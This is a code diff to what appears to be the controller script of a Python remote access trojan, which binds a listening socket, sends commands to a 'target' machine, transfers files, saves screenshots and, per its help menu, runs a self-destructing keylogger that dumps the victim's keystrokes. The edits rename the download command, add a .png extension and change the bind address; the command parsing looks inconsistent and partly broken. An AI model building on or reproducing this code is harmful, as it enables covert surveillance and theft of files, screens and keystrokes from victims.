@@ -51,10 +51,10 @@ def target_communication():
             pass
         elif command[:6] == 'upload':
             upload_file(command[7:])
-        elif command[8:] == 'download':
+        elif command[5:] == 'dload':
             download_file(command[9:])
         elif command[:10] == 'screenshot':
-                file = open(f'screenshot{count}', 'wb')
+                file = open(f'screenshot{count}.png', 'wb')
                 target.settimeout(3)
                 chunk = target.recv(1024)
                 while chunk:
@@ -72,7 +72,7 @@ def target_communication():
             clear                               --> Clear The Screen
             cd *Directory Name*                 --> Changes Directory On Target System
             upload *file name*                  --> Upload File To The target Machine
-            download *file name*                --> Download File From Target Machine
+            dload *file name*                --> Download File From Target Machine
             keylog_start                        --> Start The Keylogger
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destruct Keylogger File
@@ -83,7 +83,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('10.0.2.15', 5555))
+sock.bind(('192.168.122.121', 5555))
 print(colored('[0_0] Listening...', 'green'))
 sock.listen(5)
 
